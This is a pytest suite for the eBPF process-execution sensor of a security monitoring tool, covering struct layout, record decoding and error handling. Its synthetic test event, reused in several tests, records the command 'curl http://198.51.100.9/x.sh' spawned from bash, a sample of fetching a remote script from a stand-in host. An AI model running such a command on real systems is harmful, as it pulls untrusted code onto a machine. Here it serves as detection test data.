"""Tests for the eBPF process sensor.

Nothing here needs root or a kernel hook: the decoder is exercised with
synthetic raw records, and the sensor's failure paths are driven with patched
support probes.
"""

import ctypes
import os
from types import SimpleNamespace

import pytest

from sentinelforge.models.event import EventType, Severity
from sentinelforge.sensors.base import SensorUnavailableError
from sentinelforge.sensors.ebpf import loader
from sentinelforge.sensors.ebpf.process import (
    ARGSIZE,
    MAX_ARGS,
    TASK_COMM_LEN,
    EbpfProcessSensor,
    ExecEvent,
    build_program,
    decode_exec_record,
    decode_process_event,
    resolve_user,
    synthetic_exec_event,
    synthetic_record,
)


class TestBpfProgram:
    def test_constants_are_substituted(self):
        program = build_program()
        assert "__ARGSIZE__" not in program
        assert "__MAX_ARGS__" not in program
        assert f"#define ARGSIZE  {ARGSIZE}" in program
        assert f"#define MAX_ARGS {MAX_ARGS}" in program

    def test_program_is_read_only(self):
        """The BPF program observes; it must not contain any write helper."""
        program = build_program()
        for forbidden in (
            "bpf_probe_write_user",
            "bpf_send_signal",
            "bpf_override_return",
            "bpf_sock_ops_cb",
            "bpf_skb_store_bytes",
        ):
            assert forbidden not in program

    def test_kernel_side_filters_exist(self):
        program = build_program()
        assert "SELF_PID" in program  # never report our own execs
        assert "FILTER_UID" in program  # optional per-user filter, in-kernel

    def test_argument_capture_is_compiled_out_when_disabled(self):
        sensor = EbpfProcessSensor(capture_args=False)
        assert "-DCAPTURE_ARGS=1" not in sensor.cflags()
        assert any(flag.startswith("-DSELF_PID=") for flag in sensor.cflags())

    def test_uid_filter_becomes_a_compile_flag(self):
        assert "-DFILTER_UID=1000" in EbpfProcessSensor(uid=1000).cflags()


class TestExecEventLayout:
    """The ctypes structure must mirror ``struct exec_event_t`` exactly: same
    field order, same scalar types, same array dimensions."""

    def test_field_order(self):
        assert [name for name, _ in ExecEvent._fields_] == [
            "ts",
            "pid",
            "ppid",
            "uid",
            "gid",
            "nargs",
            "comm",
            "pcomm",
            "filename",
            "argv",
        ]

    def test_array_dimensions_match_the_c_struct(self):
        # comm/pcomm/filename auto-convert to (NUL-trimmed) bytes on access,
        # so their declared size is read off the field descriptor instead.
        assert ExecEvent.comm.size == TASK_COMM_LEN
        assert ExecEvent.pcomm.size == TASK_COMM_LEN
        assert ExecEvent.filename.size == ARGSIZE * 2
        # argv is char[MAX_ARGS][ARGSIZE]: MAX_ARGS slots, each ARGSIZE bytes.
        # Each slot is itself a fixed-size ctypes array (not auto-converted),
        # so bytes(slot) reflects the full declared width.
        instance = ExecEvent()
        assert len(instance.argv) == MAX_ARGS
        assert all(len(bytes(slot)) == ARGSIZE for slot in instance.argv)

    def test_exact_offsets_and_total_size(self):
        """Pins the whole layout: any drift from exec_event_t fails here,
        not as silently corrupted fields when decoding real kernel data."""
        expected = {
            "ts": (0, 8),
            "pid": (8, 4),
            "ppid": (12, 4),
            "uid": (16, 4),
            "gid": (20, 4),
            "nargs": (24, 4),
            "comm": (28, TASK_COMM_LEN),
            "pcomm": (28 + TASK_COMM_LEN, TASK_COMM_LEN),
            "filename": (28 + 2 * TASK_COMM_LEN, ARGSIZE * 2),
            "argv": (28 + 2 * TASK_COMM_LEN + ARGSIZE * 2, MAX_ARGS * ARGSIZE),
        }
        for name, (offset, size) in expected.items():
            field = getattr(ExecEvent, name)
            assert (field.offset, field.size) == (offset, size), name
        assert ctypes.sizeof(ExecEvent) == 512


class TestDecoder:
    def test_decodes_a_full_record(self):
        event = decode_process_event(synthetic_record(), host="fedora")

        assert event.event_type == EventType.PROCESS_START
        assert event.severity == Severity.INFO
        assert event.source == "ebpf"
        assert event.host == "fedora"
        assert event.process == "curl"
        assert event.executable == "/usr/bin/curl"
        assert event.command_line == "curl http://198.51.100.9/x.sh"
        assert event.pid == 4101
        assert event.ppid == 4100
        assert event.parent_process == "bash"
        assert event.metadata["uid"] == 1000

    def test_process_lineage_is_preserved(self):
        """pid/ppid/executable/parent are what future process-tree work needs."""
        event = decode_process_event(synthetic_record(), host="fedora")
        assert (event.pid, event.ppid) == (4101, 4100)
        assert event.parent_process == "bash"
        assert event.executable == "/usr/bin/curl"

    def test_nul_terminated_buffers_are_trimmed(self):
        event = decode_process_event(
            synthetic_record(comm=b"curl\x00\x00\x00\x00", filename=b"/usr/bin/curl\x00junk")
        )
        assert event.process == "curl"
        assert event.executable == "/usr/bin/curl"

    def test_missing_fields_become_none_not_guesses(self):
        record = SimpleNamespace(ts=0, pid=10, comm=b"sh\x00")
        event = decode_process_event(record)
        assert event.pid == 10
        assert event.ppid is None
        assert event.executable is None
        assert event.parent_process is None
        assert event.command_line is None
        assert event.process == "sh"

    def test_completely_empty_record_does_not_raise(self):
        event = decode_process_event(SimpleNamespace())
        assert event.event_type == EventType.PROCESS_START
        assert event.process is None
        assert event.metadata == {}

    def test_malformed_buffers_are_replaced_not_fatal(self):
        event = decode_process_event(
            synthetic_record(comm=b"\xff\xfe bad", filename=b"\x80\x81\x00")
        )
        assert event.event_type == EventType.PROCESS_START
        assert event.to_json()  # still serializable

    def test_arguments_beyond_the_cap_are_flagged(self):
        record = synthetic_record(
            nargs=MAX_ARGS, argv=[f"arg{i}".encode() + b"\x00" for i in range(MAX_ARGS)]
        )
        event = decode_process_event(record)
        assert event.metadata["args_truncated"] is True
        assert len(event.command_line.split()) == MAX_ARGS

    def test_nargs_zero_means_no_command_line(self):
        event = decode_process_event(synthetic_record(nargs=0))
        assert event.command_line is None
        assert "command_line" not in event.metadata

    def test_user_is_resolved_only_when_a_lookup_is_given(self):
        assert decode_process_event(synthetic_record()).user is None
        event = decode_process_event(synthetic_record(), user_lookup=lambda uid: f"uid{uid}")
        assert event.user == "uid1000"

    def test_timestamps_come_from_the_boot_clock(self):
        clock = loader.BootClock()
        event = decode_process_event(
            synthetic_record(ts=clock.monotonic_ns), clock=clock
        )
        assert event.timestamp.endswith("Z")

    def test_resolve_user_handles_unknown_uids(self):
        assert resolve_user(os.getuid()) is not None
        assert resolve_user(4294967294) is None

    def test_event_is_serializable_with_metadata(self):
        import json

        data = json.loads(decode_process_event(synthetic_record()).to_json())
        assert data["metadata"]["ppid"] == 4100
        assert data["source"] == "ebpf"


class TestManualDecoder:
    """Exercises decode_exec_record() -- the ctypes decoder that replaces
    ``self._bpf["exec_events"].event(data)`` -- against real raw bytes."""

    def test_raw_bytes_decode_matches_synthetic_record(self):
        blob = bytes(synthetic_exec_event())
        decoded = decode_exec_record(blob, len(blob))

        expected = decode_process_event(synthetic_record(), host="fedora")
        actual = decode_process_event(decoded, host="fedora")

        assert actual.process == expected.process == "curl"
        assert actual.executable == expected.executable == "/usr/bin/curl"
        assert (
            actual.command_line
            == expected.command_line
            == "curl http://198.51.100.9/x.sh"
        )
        assert (actual.pid, actual.ppid) == (expected.pid, expected.ppid) == (4101, 4100)
        assert actual.parent_process == expected.parent_process == "bash"
        assert actual.metadata["uid"] == expected.metadata["uid"] == 1000

    def test_populated_argv_is_decoded_in_order(self):
        blob = bytes(synthetic_exec_event(nargs=3, argv=[b"python3", b"-c", b"print(1)"]))
        event = decode_process_event(decode_exec_record(blob, len(blob)))
        assert event.command_line == "python3 -c print(1)"
        assert "args_truncated" not in event.metadata

    def test_argv_at_the_cap_is_flagged_truncated(self):
        argv = [f"arg{i}".encode() for i in range(MAX_ARGS)]
        blob = bytes(synthetic_exec_event(nargs=MAX_ARGS, argv=argv))
        event = decode_process_event(decode_exec_record(blob, len(blob)))
        assert event.metadata["args_truncated"] is True
        assert len(event.command_line.split()) == MAX_ARGS

    def test_no_args_mode_yields_no_command_line(self):
        """When --no-args disables capture, the kernel never populates argv;
        the manual decoder must not fabricate a command line either."""
        blob = bytes(synthetic_exec_event(nargs=0, argv=[]))
        event = decode_process_event(decode_exec_record(blob, len(blob)))
        assert event.command_line is None
        assert "command_line" not in event.metadata

    def test_truncated_record_is_rejected(self):
        blob = bytes(ExecEvent())[:10]
        with pytest.raises(ValueError, match="truncated exec record"):
            decode_exec_record(blob, len(blob))

    def test_null_pointer_record_is_rejected(self):
        with pytest.raises(ValueError, match="truncated exec record"):
            decode_exec_record(0, ctypes.sizeof(ExecEvent))

    def test_handle_event_swallows_a_truncated_record(self, caplog):
        sensor = EbpfProcessSensor()
        sensor._clock = loader.BootClock()
        sensor._handle_event(0, b"\x00" * 4, 4)  # far too short to be real
        assert sensor.events_seen == 0
        assert "unreadable exec record" in caplog.text

    def test_bcc_dynamic_event_method_is_never_invoked(self):
        """Regression guard: _handle_event must decode via ExecEvent directly
        and never reach BCC's PerfEventArray.event(), whose _get_event_class()
        path can raise SystemExit. The old multidimensional-array decode via
        ``self._bpf["exec_events"].event(data)`` must no longer be used."""

        class PoisonedTable:
            def event(self, data):  # pragma: no cover - must never run
                raise SystemExit("bcc _get_event_class exploded")

        blob = bytes(synthetic_exec_event())

        sensor = EbpfProcessSensor()
        sensor._bpf = {"exec_events": PoisonedTable()}
        sensor._clock = loader.BootClock()
        sensor._handle_event(0, blob, len(blob))

        assert sensor.events_seen == 1


class TestSensorLifecycle:
    def test_unavailable_ebpf_raises_with_a_remedy(self, monkeypatch):
        monkeypatch.setattr(
            "sentinelforge.sensors.ebpf.process.check_ebpf_support",
            lambda: loader.EbpfSupport(
                supported=False, reasons=["insufficient privileges"], remedy="run with sudo"
            ),
        )
        sensor = EbpfProcessSensor()
        with pytest.raises(SensorUnavailableError) as exc:
            sensor.start()
        assert "insufficient privileges" in exc.value.reason
        assert exc.value.remedy
        assert sensor.running is False

    def test_status_reports_why_it_cannot_run(self, monkeypatch):
        monkeypatch.setattr(
            "sentinelforge.sensors.ebpf.process.check_ebpf_support",
            lambda: loader.EbpfSupport(
                supported=False, reasons=["no BCC"], remedy="dnf install", details={"x": 1}
            ),
        )
        status = EbpfProcessSensor.status()
        assert status.available is False
        assert status.reason == "no BCC"
        assert status.remedy == "dnf install"

    def test_stop_is_safe_before_start_and_twice(self):
        sensor = EbpfProcessSensor()
        sensor.stop()
        sensor.stop()
        assert sensor.running is False

    def test_a_malformed_kernel_record_is_skipped_not_fatal(self, caplog):
        """_handle_event must swallow decode failures."""

        class Boom:
            def event(self, data):
                raise ValueError("truncated perf record")

        sensor = EbpfProcessSensor()
        sensor._bpf = {"exec_events": Boom()}
        sensor._handle_event(0, b"", 0)  # must not raise
        assert sensor.events_seen == 0
        assert "unreadable exec record" in caplog.text

    def test_dropped_events_are_counted(self, caplog):
        sensor = EbpfProcessSensor()
        sensor._handle_lost(17)
        assert sensor.events_dropped == 17
        assert "dropped" in caplog.text
